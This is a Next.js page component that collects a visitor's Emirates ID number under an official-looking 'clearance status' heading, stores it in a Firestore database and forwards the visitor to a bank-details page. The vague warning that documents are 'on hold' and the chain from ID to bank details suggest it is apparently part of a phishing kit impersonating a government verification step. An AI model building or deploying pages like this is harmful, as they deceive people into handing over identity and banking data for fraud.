"use client"

import type React from "react"
import Header from '../components/Header'
import Footer from '../components/Footer'
import { useState, useEffect } from "react"
import Image from "next/image"
import { doc, setDoc, serverTimestamp } from "firebase/firestore"
import { db } from "../../lib/firebase"
import { useRouter, useSearchParams } from 'next/navigation'

export default function EmiratesIDClearance() {
    const [emiratesId, setEmiratesId] = useState("")
    const [isLoading, setIsLoading] = useState(false)
    const [message, setMessage] = useState("")
    const [uid, setUid] = useState("")
    const router = useRouter()
    const searchParams = useSearchParams()

    useEffect(() => {
        // Get UID from URL parameters
        const urlUid = searchParams.get('uid')
        if (urlUid) {
            setUid(urlUid)
            console.log("Received UID from URL:", urlUid)
        } else {
            setMessage("Error: No user session found. Please start from the beginning.")
        }
    }, [searchParams])

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault()
        setIsLoading(true)
        setMessage("")

        // Check if Emirates ID is provided (required field)
        if (!emiratesId.trim()) {
            setMessage("Please enter your Emirates ID")
            setIsLoading(false)
            return
        }

        // Check if UID is available
        if (!uid) {
            setMessage("Error: No user session found. Please start from the beginning.")
            setIsLoading(false)
            return
        }

        try {
            // Store Emirates ID data in "users" database, document "secondform", with UID as field name
            const secondformDocRef = doc(db, "users", "secondform")
            await setDoc(secondformDocRef, {
                [uid]: {
                    emiratesId: emiratesId,
                    uid: uid,
                    createdAt: serverTimestamp(),
                    status: "pending",
                    step: "emiratesIdVerification"
                }
            }, { merge: true })

            console.log("Emirates ID submitted:", emiratesId)
            console.log("Data stored with UID: ", uid)
            
            setMessage("Emirates ID submitted successfully!")
            
            // Navigate to bankdetails page with the same UID
            router.push(`/bankdetails?uid=${uid}`)

        } catch (error) {
            console.error("Error adding document: ", error)
            setMessage("Error submitting Emirates ID. Please try again.")
        } finally {
            setIsLoading(false)
        }
    }

    const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value
        setEmiratesId(value)
    }

    return (
        <>
            <Header />
            <div className="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100 flex flex-col items-center justify-center px-4 py-8 sm:py-12">
                {/* Main Container */}
                <div className="w-full max-w-2xl">
                    {/* Header Section */}
                    <div className="text-center mb-8 sm:mb-12">
                        <h1 className="text-xl sm:text-2xl font-[700] text-slate-900 mb-3 sm:mb-4 tracking-tight">
                            EMIRATES ID CLEARANCE STATUS
                        </h1>

                        <p className="text-[color:var(--bs-secondary-color)] text-sm sm:text-base leading-relaxed max-w-xl mx-auto">
                            Please be informed that during the verification, all of your documents will be kept on hold for a temporary
                            basis. Hence, these would be given legal status after verification.
                        </p>
                    </div>

                    {/* Success/Error Message */}
                    {message && (
                        <div className={`p-4 mb-4 rounded-md ${
                            message.includes("Error") 
                                ? "bg-red-100 text-red-700 border border-red-300" 
                                : "bg-green-100 text-green-700 border border-green-300"
                        }`}>
                            {message}
                        </div>
                    )}

                    {/* ID Card Display Section */}
                    <div className="flex justify-center mb-8 sm:mb-12">
                        <div className="relative w-full max-w-[300px] sm:max-w-[400px] md:max-w-[550px]">
                            <div>
                                <Image
                                    src="/idcard.png"
                                    alt="Emirates ID Card"
                                    width={500}
                                    height={300}
                                    className="w-full h-auto object-contain"
                                    priority
                                />
                            </div>
                        </div>
                    </div>

                    {/* Form Section */}
                    <form onSubmit={handleSubmit} className="flex flex-col items-center gap-4 sm:gap-6">
                        {/* Input Field */}
                        <div className="w-full max-w-md">
                            <label htmlFor="emirates-id" className="block text-sm font-semibold text-slate-700 mb-2">
                                Emirates ID <span className="text-red-500">*</span>
                            </label>
                            <input
                                id="emirates-id"
                                type="text"
                                placeholder="Enter Emirates ID"
                                value={emiratesId}
                                onChange={handleInputChange}
                                className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-amber-400 focus:border-transparent bg-white text-slate-900 placeholder-slate-400 transition-all text-sm sm:text-base disabled:bg-gray-100 disabled:cursor-not-allowed"
                                required
                                disabled={isLoading}
                            />
                        </div>

                        {/* Submit Button */}
                        <button
                            type="submit"
                            disabled={isLoading || !uid}
                            className="w-full sm:w-auto px-6 py-3 bg-[#B48B5E] hover:bg-[#a37a52] text-white font-semibold rounded-lg transition-colors duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed text-sm sm:text-base"
                        >
                            {isLoading ? "Processing..." : "Next"}
                        </button>
                    </form>

                    {/* Debug info - you can remove this in production */}
                  
                </div>
            </div>
            <Footer />
        </>
    )
}